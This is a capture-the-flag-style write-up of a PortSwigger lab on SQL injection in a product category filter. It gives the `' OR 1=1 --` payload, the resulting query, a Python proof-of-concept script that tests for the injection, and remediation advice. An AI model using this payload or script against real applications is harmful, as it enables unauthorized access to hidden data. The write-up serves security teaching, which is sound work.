# SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-14

## The Problem
The application had a product category filter. When a user selected a category, the application ran a SQL query like:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The `category` value came directly from user input (the URL query parameter) and was concatenated straight into the SQL query with no sanitization or parameterization. The `AND released = 1` condition was meant to hide products that haven't been officially released yet.

## Discovery / Exploitation
Testing began with basic probing in the `category` parameter:

- `' AND 1=1 --` vs `' AND 1=2 --` on the search field gave identical results — a sign that particular field wasn't reflecting the injection.
- Switching to `' OR 1=1 --` on the vulnerable parameter caused a large jump in the number of results returned (e.g. 492 vs 151), confirming the input was reaching the SQL query unsanitized.

The exploit itself uses the `OR` operator to make the entire `WHERE` clause evaluate to true, and a comment (`--`) to strip out the trailing `AND released = 1` condition:

```
category=Gifts' OR 1=1 --
```

Resulting query:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
```

Because `--` comments out everything after it, `AND released = 1` never executes, and `OR 1=1` makes every row match — including unreleased products.

## Impact
An attacker can bypass the intended filtering logic entirely and access data the application was explicitly trying to hide (unreleased/unpublished products in this case). In a real system, the same technique could expose other sensitive filtered data depending on what conditions the hidden `AND` clauses enforce.

## Proof of Concept (Python)
This script routes traffic through Burp Suite (`127.0.0.1:8080`) and checks the `category` filter for injection by looking for a known string (`cat grin`) that only appears when an otherwise-hidden product is returned.

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli(url, payload):
    uri = 'filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "cat grin" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] usage : %s <url> <payload>" % sys.argv[0])
        print('[-] example : %s https://www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] sql injection successful")
    else:
        print("[-] sql injection unsuccessful")
```

**How it works:**
1. Takes the target URL and a payload as command-line arguments
2. Sends a GET request to `filter?category=<payload>` through the Burp proxy
3. Checks the response body for a string that only shows up when a hidden/unreleased product is returned
4. Prints whether the injection succeeded

## Remediation
- Use **parameterized queries (prepared statements)** instead of concatenating user input into SQL strings — this is the primary defense.
- Apply the **principle of least privilege** to the database account used by the application.
- Use an **allowlist** for expected category values where possible, instead of trusting free-form input.
- Never rely on application-layer filtering (like `AND released = 1`) as the only barrier — if the query itself is injectable, every condition in it can be bypassed.

## Takeaway
This is a classic **SQL injection via unsanitized WHERE clause** (OWASP Top 10 #3 — Injection). The key lesson: comparing behavior between logically equivalent-but-different payloads (`1=1` vs `1=2`, `AND` vs `OR`) is the fastest way to confirm whether input is actually reaching the database unsanitized, rather than being caught by search/filtering logic upstream.
